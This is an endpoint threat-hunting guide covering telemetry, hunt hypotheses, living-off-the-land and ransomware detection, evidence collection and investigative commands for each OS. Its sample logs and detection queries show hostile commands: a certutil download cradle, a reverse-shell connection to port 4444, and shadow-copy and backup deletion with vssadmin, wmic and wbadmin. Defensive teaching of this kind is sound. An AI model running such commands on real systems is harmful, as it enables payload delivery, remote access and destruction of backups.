Threat Hunting on the Endpoint, Where the Fight Is Actually Won

Alerts tell you what your tools already know to look for. Hunting finds what they missed. Here is how I run host telemetry, form hunt hypotheses, and chase ransomware and living-off-the-land tradecraft across Linux, macOS, and Windows.

// 01

Hunting versus waiting for alerts

Your EDR is good at catching what it has signatures and behavioral models for. The problem is the adversary who does not trip any of them: the one using legitimate admin tools, moving slowly, blending into normal activity. That attacker does not generate an alert. The only way you find them is by going to look, with a hypothesis, in the data. That is hunting.

The defining feature of a hunt is that it starts from a hypothesis, not an alert. "If an attacker were living in our environment using stolen credentials and built-in tools, what trace would they leave, and can I find it?" Then you go look. Sometimes you find evil. Often you find a misconfiguration or a noisy admin instead, and that is still a win because you learned your environment and maybe built a new detection.

The hunter's loop Hypothesis, then hunt the data, then one of two outcomes: you find something (escalate to IR), or you do not (turn the hunt into an automated detection so you never have to hunt it by hand again). A hunt that finds nothing should still leave behind a new detection. That is how the program compounds.
// 02

The telemetry you actually need

You cannot hunt blind. The non-negotiable host signals are process execution with full command lines and parent-child relationships, network connections tied to processes, file and registry changes, and authentication events. On Windows, that means Sysmon or a real EDR, not just the default event log. On Linux, auditd or eBPF-based tooling. On macOS, the Endpoint Security framework via your EDR.

linux // confirm auditd is capturing execve (process exec)
$ sudo auditctl -l | grep execve
-a always,exit -F arch=b64 -S execve -k proc_exec
$ # if empty, you are hunting with one eye closed. add it:
$ sudo auditctl -a always,exit -F arch=b64 -S execve -k proc_exec
  now logging every process execution with arguments

The command line is the crown jewel of endpoint telemetry. The difference between "powershell.exe ran" and "powershell.exe ran with a base64-encoded download cradle" is the entire investigation. If your tooling truncates or drops command-line arguments, fixing that is the highest-value thing you can do before any hunt.

// 03

Hunt hypothesis templates

A good hypothesis is specific enough to query. "Find malware" is not a hypothesis. "An attacker established persistence via a scheduled task that runs a script from a temp directory" is. Here are templates I reuse, framed as fill-in-the-blanks.

Hunt themeHypothesis shapeWhere to look
PersistenceAttacker survives reboot via [autorun mechanism]Scheduled tasks, services, run keys, cron, launchd
Credential accessAttacker dumped creds from [process/store]LSASS access, /etc/shadow reads, keychain access
Lateral movementAttacker moved to [host] via [remote service]Remote logons, service creation on remote host
Defense evasionAttacker cleared [log] or disabled [tool]Log clears, security service stops, timestomping
ExfiltrationData left via [channel] to [rare destination]Large transfers, archives created then sent, DNS tunneling

Take persistence. The hypothesis is "an attacker created a scheduled task that launches something from a user-writable directory." That is directly queryable.

windows // scheduled tasks launching from temp/appdata (PowerShell)
PS> Get-ScheduledTask | ForEach-Object {
  $a = $_.Actions.Execute
  if ($a -match 'Temp|AppData|ProgramData\\[^\\]+\.(exe|ps1|vbs)') {
    [pscustomobject]@{ Task=$_.TaskName; Runs=$a; Author=$_.Author }
  }
}
Task            Runs                              Author
UpdaterSvc      C:\Users\jdoe\AppData\..\s.ps1     N/A
# a task named to look benign, running a script from a user dir,
# with no author. that is worth pulling the thread on.

Living off the land

The hardest adversary to catch uses your own tools against you: PowerShell, WMI, certutil, rundll32 on Windows; bash, curl, ssh, cron on Linux. Nothing they run is malware. The signal is in how the legitimate tool is used: certutil downloading a file, rundll32 with a weird export, a shell with a network connection to a rare host.

windows // certutil used as a download cradle (a classic LOLBin)
spl> index=endpoint process_name=certutil.exe
  (process="*urlcache*" OR process="*-f http*" OR process="*decode*")
| table _time host user process
_time        host       user    process
06-01 14:22  WS-FIN-04  jdoe    certutil -urlcache -f http://x/p.exe p.exe
# certutil is a cert tool. nobody legit uses it to fetch an exe.
linux // a shell with an outbound connection to a rare host
$ sudo ss -tnp | awk '/bash|sh|python|nc/ {print}'
ESTAB 0 0 10.0.4.9:51234 198.51.100.7:4444 users:(("bash",pid=8821))
# a bash process with an ESTABLISHED connection to :4444
# to an external IP. that smells like a reverse shell.
$ sudo ls -la /proc/8821/exe /proc/8821/cwd  # pivot to investigate
Baseline first Living-off-the-land hunting drowns you in false positives unless you know what normal looks like. Your admins use PowerShell and ssh constantly. Spend time learning the baseline (which accounts, which hosts, which patterns are routine) so the genuinely odd thing stands out. The hunt is really an anomaly search against a baseline you have to build first.
// 05

Ransomware playbook

Ransomware is the incident every endpoint team will eventually face. By the time files are encrypting, you are already late; the goal is to catch the activity in the window between initial access and detonation, which is often hours or days. The behavioral tells before encryption: mass enumeration of file shares, deletion of shadow copies and backups, disabling of security tools, and staging of an archive for exfil (modern ransomware steals before it encrypts).

windows // shadow-copy deletion, a near-universal pre-encryption step
spl> index=endpoint (process="*vssadmin* delete shadows*"
  OR process="*wmic* shadowcopy delete*"
  OR process="*wbadmin* delete catalog*"
  OR process="*bcdedit* recoveryenabled no*")
| table _time host user process
_time        host      user    process
06-01 02:11  SRV-FILE  SYSTEM  vssadmin.exe delete shadows /all /quiet
# this is the moment to act. backups are being destroyed
# so recovery is impossible. isolate the host NOW.

When you confirm ransomware activity, the response order matters. Isolate first, investigate second. Pull the host off the network (logically, keep it powered for memory forensics if you can), because every minute it stays connected is more files encrypted and more lateral spread. Then preserve evidence, identify patient zero, and scope the blast radius before you even think about recovery.

Do not reboot The instinct to reboot a ransomware host is wrong. Encryption keys, injected code, and the attacker's tooling may live only in memory. A reboot destroys that evidence and can also trigger encryption routines waiting on restart. Isolate the network, preserve memory, then proceed. And never pay before exhausting backups and engaging the right legal and IR channels; that is a decision for leadership, not the SOC.

Modern ransomware steals before it encrypts

One thing has changed about ransomware that reshapes how you respond to it: encryption is now often the last act, not the first. The dominant model is double extortion, where the crew exfiltrates a large volume of your data over days or weeks, and only then encrypts, so they can demand payment both to decrypt and to not publish what they took. This matters enormously for your response, because it means that by the time you see encryption, a data breach has very likely already happened, and "we restored from backups" does not make the stolen data come back.

So the hunt shifts upstream. The encryption is loud and late; the valuable detection window is the quiet staging and exfiltration that preceded it. Look for the signs of bulk collection and outbound transfer that ransomware crews leave during their dwell time: large archives suddenly appearing, especially split into volumes, unusual volumes of data moving to cloud storage or a rare external host, and the use of legitimate transfer tools in places they have never run before.

hunt the staging that precedes encryption, not just the encryption
$ # large archive files created recently, a classic staging tell
$ find / -type f \( -name "*.7z" -o -name "*.zip" -o -name "*.rar" \) \
  -size +500M -mtime -3 2>/dev/null -exec ls -lh {} \;
-rw-r--r-- 1 svc www 2.3G /tmp/.cache/bk01.7z   # hidden dir, huge, 2 days old
$ # and unusual outbound volume by host (netflow / proxy)
spl> index=netflow | stats sum(bytes_out) AS out BY src_host
       | where out > 10000000000 | sort -out
SRV-FILE-02   847 GB outbound in 24h   # a file server should not do this
It is a breach the moment data leaves Treat confirmed exfiltration as a reportable data breach in its own right, separate from the encryption event, because legally and practically it usually is. The notification clock, the regulatory obligations, and the legal exposure attach to the data leaving, not to the files being locked. Backups solve the availability problem. They do nothing for the confidentiality one. Get legal involved the moment you see signs of bulk exfiltration, not after the ransom note appears.

Evidence collection standards

If an incident might end up in court, in an insurance claim, or in a regulator's inbox, how you collect evidence matters as much as what you collect. Order of volatility governs the sequence: grab the most ephemeral data first. Memory before disk, network state before logs, because memory and live connections vanish the moment the machine changes state.

linux // collect volatile evidence in the right order, with hashes
$ # 1. memory first (most volatile), to external, write-once media
$ sudo avml /mnt/eviddrive/$(hostname)-mem-$(date +%s).lime
$ # 2. live network + process state
$ sudo ss -tunap > /mnt/eviddrive/connections.txt
$ ps auxww > /mnt/eviddrive/processes.txt
$ # 3. hash EVERYTHING for chain of custody
$ sha256sum /mnt/eviddrive/* > /mnt/eviddrive/MANIFEST.sha256
  evidence captured, hashed, timestamped
$ # record who, what, when, where in a custody log alongside it
Chain of custody is a habit, not a tool Hash everything at collection, log who touched it and when, store it on write-once or access-controlled media, and never work on originals (work on verified copies). You may never need it in court, but if you do and you skipped this, the evidence is worthless. Build the habit on every incident so it is automatic when it counts.

Cross-platform investigative quick reference

The same investigative questions, answered on each OS. When you land on an unfamiliar host mid-incident, these are the first things you ask: what is running, what is talking to the network, what persists across reboot, and who logged in.

what is running + what is on the network
# LINUX
$ ps auxww --sort=-%cpu | head            # processes
$ sudo ss -tunap                          # connections+pids
$ sudo lsof -i -nP                         # open network files

# MACOS
$ ps -axo pid,ppid,user,comm | head
$ sudo lsof -i -nP
$ log show --predicate 'eventType==logEvent' --last 1h

# WINDOWS (PowerShell)
PS> Get-Process | Sort CPU -Desc | Select -First 10
PS> Get-NetTCPConnection -State Established |
       Select LocalAddress,RemoteAddress,OwningProcess
what persists across reboot + who logged in
# LINUX
$ sudo crontab -l; ls -la /etc/cron.*; systemctl list-timers
$ last -aF | head; sudo grep -i accepted /var/log/auth.log

# MACOS
$ ls -la ~/Library/LaunchAgents /Library/Launch*
$ last | head

# WINDOWS (PowerShell)
PS> Get-ScheduledTask | ? State -ne Disabled
PS> Get-CimInstance Win32_StartupCommand
PS> Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -Max 20
Authorized systems only Run these on systems you own or are explicitly authorized to investigate. Investigative commands on machines you do not have authority over can itself be unlawful, no matter how good the intent. When in doubt, get written authorization first.
// 08

Building a hunt program, not just doing hunts

A single good hunt is a nice afternoon. A hunt program is what actually moves your security posture, and the difference is structure. Without it, hunting becomes a thing one talented person does when they have spare time, which means it stops the moment they are busy or they leave. With it, hunting is a repeatable cadence that compounds whether or not any individual is having a good week.

The backbone is a simple loop run on a schedule: pick a focus from your threat model, form specific hypotheses, hunt them, document what you found and what you did not, and convert anything repeatable into an automated detection so you never hunt it by hand again. That last step is the flywheel. Every hunt either finds something (which becomes an incident) or finds nothing (which becomes a detection that watches for it forever). Either way the program gets stronger, and your manual hunting time keeps moving to fresh ground instead of re-checking old ground.

Prioritize hunts by what would actually hurt

You cannot hunt everything, so let your threat model drive the queue. If you are a hospital, ransomware and data theft top the list. If you are a defense supplier, it is patient nation-state persistence. Pick the techniques your most likely adversaries actually use against organizations like yours, and hunt those first. The point of a threat-informed program is to spend your limited hunting hours where a real attacker is most likely to be, not on whatever technique you read about last week.

Write it down even when you find nothing The most undervalued artifact in hunting is the record of a hunt that found nothing. It tells the next person this ground was already checked, when, and how, so they do not waste time repeating it, and it documents your coverage for anyone who asks what you are watching for. "We hunted for this and found it clean on this date" is a genuinely useful sentence. Treat the documentation as part of the deliverable, not an afterthought, or your program will keep re-hunting the same ground and forgetting it did.
// 09

Becoming a hunter

The shift from analyst to hunter is the shift from reacting to alerts to proactively asking questions of your data. It is a muscle you build: pick a technique, form a hypothesis, go look, and whether or not you find evil, leave behind a detection so the next time it is automatic. Do that every week and within a year your coverage and your instincts both compound.

The adversary is already assuming they can hide in your tools and your noise. Hunting is how you prove them wrong. Go look.
